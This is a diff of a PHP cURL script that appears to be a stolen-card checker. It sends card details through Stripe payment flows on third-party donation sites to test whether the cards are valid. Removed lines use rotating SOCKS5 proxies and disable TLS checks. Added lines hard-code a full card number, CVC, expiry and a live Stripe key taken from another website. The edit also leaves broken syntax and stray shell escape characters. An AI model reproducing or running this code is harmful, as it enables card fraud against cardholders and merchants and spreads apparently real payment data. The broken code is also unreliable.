@@ -448,38 +448,32 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 
 curl_setopt($ch, CURLOPT_POSTFIELDS,'action=gfstripe_create_payment_intent&nonce='.$nonce.'&payment_method%5Bid%5D='.$id.'&payment_method%5Bobject%5D=payment_method&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bcity%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bcountry%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bline1%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bline2%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bpostal_code%5D=90023&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bstate%5D=&payment_method%5Bbilling_details%5D%5Bemail%5D=&payment_method%5Bbilling_details%5D%5Bname%5D=Badboy+chk&payment_method%5Bbilling_details%5D%5Bphone%5D=&payment_method%5Bcard%5D%5Bbrand%5D=visa&payment_method%5Bcard%5D%5Bchecks%5D%5Baddress_line1_check%5D=&payment_method%5Bcard%5D%5Bchecks%5D%5Baddress_postal_code_check%5D=&payment_method%5Bcard%5D%5Bchecks%5D%5Bcvc_check%5D=&payment_method%5Bcard%5D%5Bcountry%5D=US&payment_method%5Bcard%5D%5Bexp_month%5D='.$mes.'&payment_method%5Bcard%5D%5Bexp_year%5D='.$ano.'&payment_method%5Bcard%5D%5Bfunding%5D=debit&payment_method%5Bcard%5D%5Bgenerated_from%5D=&payment_method%5Bcard%5D%5Blast4%5D='.$l4.'&payment_method%5Bcard%5D%5Bnetworks%5D%5Bavailable%5D%5B%5D=visa&payment_method%5Bcard%5D%5Bnetworks%5D%5Bpreferred%5D=&payment_method%5Bcard%5D%5Bthree_d_secure_usage%5D%5Bsupported%5D=true&payment_method%5Bcard%5D%5Bwallet%5D=&payment_method%5Bcreated%5D='.$crt.'&payment_method%5Bcustomer%5D=&payment_method%5Blivemode%5D=true&payment_method%5Btype%5D=card&currency=USD&amount=100&feed_id=1');
 
-$result2 = curl_exec($ch);
-$pi = trim(strip_tags(getStr($result2,'"id":"','"')));
-$scrt = trim(strip_tags(getStr($result2,'"client_secret":"','"')));
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_PROXY, $socks5);
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://fhschoirs.com/sponsors/donate-to-us/');
+
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'POST /sponsors/donate-to-us/ h2',
-'Host: fhschoirs.com',
-'cache-control: max-age=0',
-'upgrade-insecure-requests: 1',
-'origin: https://fhschoirs.com',
-'content-type: multipart/form-data; boundary=----WebKitFormBoundarykrdchXIX9TxT1GVA',
-'user-agent: Mozilla/5.0 (Linux; Android 11; 220333QBI Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/97.0.4692.98 Mobile Safari/537.36',
-'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-'x-requested-with: com.xbrowser.play',
-'sec-fetch-site: same-origin',
-'sec-fetch-mode: navigate',
-'sec-fetch-user: ?1',
-'sec-fetch-dest: iframe',
-'referer: https://fhschoirs.com/sponsors/donate-to-us/',
-'accept-language: en-IN,en-US;q=0.9,en;q=0.8',
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&card^[number^]=4634165446282250&card^[cvc^]=972&card^[exp_month^]=04&card^[exp_year^]=25&guid=119a750e-9494-4efe-b137-e7a49987e99393b097&muid=7f20698b-9981-40ec-ad0e-a13e6787602cfd2b13&sid=3fd5d4aa-f855-4215-aead-59c5701fbf26a8eb89&pasted_fields=number&payment_user_agent=stripe.js^%^2F5816dc8686^%^3B+stripe-js-v3^%^2F5816dc8686^%^3B+split-card-element&referrer=https^%^3A^%^2F^%^2Fwww.yasminmogahedtv.com&time_on_page=240644&key=pk_live_51HdbmyHNc8MTJAaGytBzUdQLnsyVtugsmpGoxyN6NwE9ip5CsvYgmwAgxB5JBcyGnORmoxbtZzdvMl4AN6TwejOX00t0lGfzmO");
+curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
+
+$headers = array();
+$headers[] = 'Authority: api.stripe.com';
+$headers[] = 'Accept: application/json';
+$headers[] = 'Accept-Language: es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6';
+$headers[] = 'Cache-Control: no-cache';
+$headers[] = 'Content-Type: application/x-www-form-urlencoded';
+$headers[] = 'Origin: https://js.stripe.com';
+$headers[] = 'Pragma: no-cache';
+$headers[] = 'Referer: https://js.stripe.com/';
+$headers[] = 'Sec-Ch-Ua: ^^Not_A';
+$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
+$headers[] = 'Sec-Ch-Ua-Platform: ^^Windows^^\"\"';
+$headers[] = 'Sec-Fetch-Dest: empty';
+$headers[] = 'Sec-Fetch-Mode: cors';
+$headers[] = 'Sec-Fetch-Site: same-site';
+$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+
 ));
 
 ////////////////////////////===[2 Req Postfields]
